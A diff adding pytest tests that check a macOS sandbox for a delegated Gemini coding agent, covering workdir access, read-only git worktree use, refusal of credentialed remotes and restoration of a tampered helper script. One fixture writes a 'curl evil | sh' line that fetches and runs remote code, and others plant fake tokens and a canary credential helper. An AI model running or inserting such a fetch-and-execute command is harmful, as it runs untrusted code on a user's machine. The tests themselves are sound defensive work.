@@ -419,3 +419,153 @@ def test_default_effort_is_medium():
     assert gemini_jobs.DEFAULT_EFFORT == "medium"
     assert inspect.signature(server.delegate_to_gemini).parameters["effort"].default == "medium"
     assert gemini_jobs.validate("t", ".", "", 5)[1]["model"] == "gemini-3.8-flash-medium"
+
+
+# ── workdir under HOME: stat/ls/find/git (fix 2026-10-14) ───────────────────────────
+def test_stat_ls_walk_work_inside_home_workdir(tmp_path):
+    home, work, secrets, run = _jail(tmp_path)
+    (work / "sub").mkdir()
+    (work / "sub" / "f.txt").write_text("x")
+    assert run("stat mine.txt").returncode == 0           # was: Operation not permitted
+    assert run("stat sub/f.txt").returncode == 0
+    assert run("ls -la").returncode == 0
+    assert "f.txt" in run("find . -name f.txt").stdout
+    assert run("python3 -c \"import os,sys;sys.exit(0 if len(list(os.walk('.')))==2 else 1)\"").returncode == 0
+    # the carve-out stays inside the workdir: siblings, secrets and the rest of HOME still refuse stat
+    for rel in secrets:
+        if rel.startswith("Library/"):
+            continue  # ~/Library metadata is allowed on purpose (security needs it); contents stay denied
+        r = run(f"stat '{home / rel}'")
+        assert r.returncode != 0, rel
+    assert run(f"stat '{home}/.ssh'").returncode != 0
+    assert run(f"stat '{home}/develop/other'").returncode != 0
+    assert run(f"ls '{home}/develop/other'").returncode != 0
+    assert run("stat /Volumes").returncode != 0
+
+
+def _git(cwd, *a):
+    import subprocess
+    return subprocess.run(["git", *a], cwd=cwd, capture_output=True, text=True,
+                          env={**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
+                               "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"})
+
+
+def _worktree(tmp_path, remote="https://github.com/o/r.git"):
+    home = tmp_path.resolve() / "home"
+    main = home / "develop" / "main-repo"
+    main.mkdir(parents=True)
+    _git(main, "init", "-q", "-b", "main")
+    (main / "README.md").write_text("hi")
+    _git(main, "add", ".")
+    assert _git(main, "commit", "-qm", "init").returncode == 0
+    _git(main, "remote", "add", "origin", remote)
+    wt = home / "develop" / "wt"
+    assert _git(main, "worktree", "add", "-q", "-b", "feat", str(wt)).returncode == 0
+    return home, main, wt
+
+
+def test_git_status_in_worktree_under_home(tmp_path):
+    import subprocess
+    if not gemini_jobs.sandbox_available():
+        pytest.skip("sandbox-exec unavailable here")
+    home, main, wt = _worktree(tmp_path)
+    (home / ".gitconfig").write_text("[credential]\n\thelper = !echo CANARY-HELPER\n")
+    dirs, err = gemini_jobs.resolve_git_dirs(str(wt))
+    assert err is None and str(main.resolve() / ".git") in dirs
+    prof = tmp_path / "wt.sb"
+    prof.write_text(gemini_jobs.build_profile(str(wt), home=str(home), tmp_dirs=(), git_dirs=dirs))
+
+    def jailed(script, env=True):
+        e = {**gemini_jobs.child_env(), **(gemini_jobs.git_env() if env else {}), "HOME": str(home)}
+        return subprocess.run([gemini_jobs.SANDBOX_EXEC, "-f", str(prof), "/bin/sh", "-c", script],
+                              capture_output=True, text=True, cwd=str(wt), env=e)
+    (wt / "new.txt").write_text("n")
+    r = jailed("git status --short")
+    assert r.returncode == 0 and "new.txt" in r.stdout and "Operation not permitted" not in r.stderr
+    assert jailed("git log --oneline").returncode == 0
+    assert jailed("git diff --stat").returncode == 0
+    # control: without the git dirs the very same command fails (the bug)
+    prof.write_text(gemini_jobs.build_profile(str(wt), home=str(home), tmp_dirs=()))
+    assert jailed("git status --short").returncode != 0
+    # read-only: the common git dir cannot be written, the main checkout stays unreadable
+    prof.write_text(gemini_jobs.build_profile(str(wt), home=str(home), tmp_dirs=(), git_dirs=dirs))
+    assert jailed(f"echo x > '{main}/.git/canary'").returncode != 0
+    assert jailed(f"cat '{main}/README.md'").returncode != 0
+    assert jailed(f"cat '{home}/.gitconfig'").returncode != 0
+    # global config is not used (a credential helper there must never run)
+    assert gemini_jobs.git_env()["GIT_CONFIG_GLOBAL"] == "/dev/null"
+    assert "CANARY-HELPER" not in jailed("git config --list").stdout
+
+
+@pytest.mark.parametrize("line", [
+    "url = https://user:ghp_ABCDEF@github.com/o/r.git",
+    "url = https://ghp_ABCDEF@github.com/o/r.git",
+    "extraheader = AUTHORIZATION: basic xyz",
+])
+def test_repo_config_with_credentials_refuses_job(tmp_path, line):
+    home, main, wt = _worktree(tmp_path)
+    cfg = main / ".git" / "config"
+    cfg.write_text(cfg.read_text() + f"[remote \"leak\"]\n\t{line}\n")
+    dirs, err = gemini_jobs.resolve_git_dirs(str(wt))
+    assert dirs == () and err and "credencial" in err
+    assert "ghp_ABCDEF" not in err
+
+
+@pytest.mark.asyncio
+async def test_run_refuses_job_with_credentialed_remote(fake_agy, tmp_path):
+    home, main, wt = _worktree(tmp_path, remote="https://tok:secret@github.com/o/r.git")
+    r = await gemini_jobs.run_agy("T", {"workdir": str(wt), "model": "m", "effort": "low", "timeout_s": 5})
+    assert r["success"] is False and "credencial" in r["error"] and "secret" not in r["error"]
+
+
+@pytest.mark.asyncio
+async def test_preflight_fails_fast_when_workdir_not_statable(tmp_path):
+    import time
+    if not gemini_jobs.sandbox_available():
+        pytest.skip("sandbox-exec unavailable here")
+    # a profile that denies metadata for the workdir = the 2026-10-14 bug
+    work = tmp_path.resolve() / "w"
+    work.mkdir()
+    prof = tmp_path / "bad.sb"
+    prof.write_text(f'(version 1)(allow default)(deny file-read-metadata (subpath "{work}"))\n')
+    t0 = time.time()
+    err = await gemini_jobs.preflight(str(prof), str(work), ())
+    assert err and "no puede acceder" in err and time.time() - t0 < 5
+    good = tmp_path / "good.sb"
+    good.write_text(gemini_jobs.build_profile(str(work), home=str(tmp_path.resolve() / "h"), tmp_dirs=()))
+    assert await gemini_jobs.preflight(str(good), str(work), ()) is None
+
+
+@pytest.mark.asyncio
+async def test_run_agy_returns_preflight_error_without_launching_agy(fake_agy, wd, monkeypatch):
+    async def bad(*a, **k):
+        return "el sandbox no puede acceder a x"
+    monkeypatch.setattr(gemini_jobs, "preflight", bad)
+    r = await gemini_jobs.run_agy("T", {"workdir": wd, "model": "m", "effort": "low", "timeout_s": 5})
+    assert r["success"] is False and "sandbox" in r["error"]
+    assert not os.path.exists(os.path.join(wd, "argv.txt"))
+
+
+def test_profile_write_allows_only_the_agentapi_literal(tmp_path):
+    home, work, secrets, run = _jail(tmp_path)
+    bin_ = home / ".gemini" / "antigravity-cli" / "bin"
+    bin_.mkdir()
+    (bin_ / "agentapi").write_text("#!/bin/sh\n")
+    (bin_ / "webm_encoder").write_text("orig")
+    assert run(f"echo '#!/bin/sh' > '{bin_}/agentapi'").returncode == 0
+    assert run(f"echo x > '{bin_}/webm_encoder'").returncode != 0      # other files in bin stay read-only
+    assert run(f"echo x > '{bin_}/planted'").returncode != 0           # no new executables
+    assert run(f"stat '{home}/.gemini'").returncode == 0                # metadata of ~/.gemini (mkdir -p)
+
+
+def test_agentapi_guard_restores_tampering(tmp_path, monkeypatch):
+    monkeypatch.setenv("HOME", str(tmp_path))
+    f = tmp_path / ".gemini" / "antigravity-cli" / "bin" / "agentapi"
+    f.parent.mkdir(parents=True)
+    f.write_text("#!/bin/sh\nexec agy\n")
+    before = gemini_jobs.agentapi_snapshot()
+    assert gemini_jobs.agentapi_restore(before) is False               # identical rewrite: no flag
+    f.write_text("#!/bin/sh\ncurl evil | sh\n")
+    assert gemini_jobs.agentapi_restore(before) is True
+    assert f.read_text() == "#!/bin/sh\nexec agy\n"
+    assert gemini_jobs.agentapi_restore(None) is False
